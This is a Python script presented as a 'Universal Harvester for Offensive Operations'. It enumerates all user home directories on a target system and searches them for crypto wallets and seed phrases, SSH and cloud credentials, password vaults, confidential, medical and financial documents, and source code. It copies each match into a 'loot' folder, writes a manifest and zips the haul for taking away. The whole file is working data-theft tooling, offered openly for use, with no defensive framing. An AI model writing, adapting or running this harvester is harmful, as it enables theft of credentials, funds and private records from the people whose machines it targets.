"""
Universal Harvester for Offensive Operations
Scans a target system for valuable files:
- Crypto keys/seeds/wallets
- Credentials (SSH, cloud, browser, API keys)
- Passwords and secrets
- Business or confidential documents
- Source code and git data
Findings are saved to a manifest and (optionally) zipped into a loot archive.

Requires: Python 3.7+, standard library only (for additional browser/cloud extraction, add-ons may be required)
"""

import os
import re
import shutil
import zipfile
from pathlib import Path

USER_DIRS = [str(Path.home())]  # Expand to all user home dirs if needed

# Patterns and folders for harvesting
CRYPTO_PAT = [
    r"wallet\.dat",
    r"\b(0x)?[a-fA-F0-9]{64,66}\b",
    r"\b([a-z]+ ){11,23}[a-z]+\b",    # Mnemonic
    r"keystore",
    r"UTC--.*",
]
CRED_PAT = [
    r"id_rsa",
    r"aws",
    r"gcloud",
    r"azure",
    r"credentials",
    r"secret",
    r"passwd",
    r"vpn",
    r"ovpn",
    r".pfx",
    r".pem",
    r".ppk",
    r".kdbx",
    r"login",
    r"access",
]
DOC_PAT = [
    r".*confidential.*",
    r".*tax.*",
    r".*finance.*",
    r".*insurance.*",
    r".*register.*",
    r".*doctor.*", r".*medical.*",
    r".*blueprint.*",
    r".*presentation.*(.pptx|.ppt)?",
    r".*project.*",
    r".*contract.*",
    r".*nda.*",
    r".*202[0-9].*"
]
CODE_PAT = [
    r".*\.py", r".*\.js", r".*\.go", r".*\.java", r".*\.c", r".*\.cpp", r".*\.rb",
    r".*\.sh", r".*\.ps1", r".*\.bat", r"\.env", r"docker-compose", r"Makefile",
    r".*\.git.*"
]

TARGETS = [
    (CRYPTO_PAT, "crypto"),
    (CRED_PAT, "credentials"),
    (DOC_PAT, "documents"),
    (CODE_PAT, "code")
]

LOOT_DIR = "loot"
MANIFEST = "harvest_manifest.txt"

# Limit max file size for loot (10MB)
MAX_SIZE = 10 * 1024 * 1024

def is_match(patterns, filename):
    for pat in patterns:
        try:
            if re.search(pat, filename, re.IGNORECASE):
                return True
        except Exception:
            continue
    return False

def enumerate_user_dirs():
    homes = []
    try:
        # Try to collect all home/user directories (works on Unix & Windows)
        base = Path("/Users") if os.name == "posix" else Path("C:/Users")
        for u in base.iterdir():
            if u.is_dir():
                homes.append(str(u))
    except Exception:
        # Fallback to current home dir
        homes = [str(Path.home())]
    return list(set(homes))

def harvest():
    findings = []
    harvested = []
    loot_path = Path(LOOT_DIR)
    loot_path.mkdir(exist_ok=True)
    user_dirs = enumerate_user_dirs()
    for base_dir in user_dirs:
        for root, dirs, files in os.walk(base_dir):
            # Basic sensitive folders first
            folders = ["Documents", "Desktop", ".ssh", ".aws", ".gcp", ".azure", ".vscode", ".config", ".git"]
            if any(f in root for f in folders):
                pass  # more likely to contain loot
            for file in files:
                f_path = os.path.join(root, file)
                rel_path = os.path.relpath(f_path, base_dir)
                label = None
                # Classify
                for pat_list, cat in TARGETS:
                    if is_match(pat_list, file) or is_match(pat_list, rel_path):
                        label = cat
                        break
                if label:
                    size = 0
                    try:
                        size = os.path.getsize(f_path)
                    except Exception:
                        continue
                    findings.append(f"[{label}] {f_path} ({round(size/1024,2)} KB)")
                    # Copy small-ish files to loot, preserve path
                    if size < MAX_SIZE:
                        loot_subpath = loot_path / label / rel_path
                        loot_subpath.parent.mkdir(parents=True, exist_ok=True)
                        try:
                            shutil.copy2(f_path, loot_subpath)
                            harvested.append(str(loot_subpath))
                        except Exception:
                            continue
    # Write loot manifest
    with open(MANIFEST, "w") as mf:
        mf.write("\n".join(findings))
    # Zip up loot folder
    loot_zip = LOOT_DIR + ".zip"
    with zipfile.ZipFile(loot_zip, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for f in harvested:
            arc = os.path.relpath(f, LOOT_DIR)
            zipf.write(f, arc)
    print(f"[√] Harvest complete! {len(findings)} items listed in {MANIFEST}, and loot archived in {loot_zip}.")

if __name__ == "__main__":
    harvest()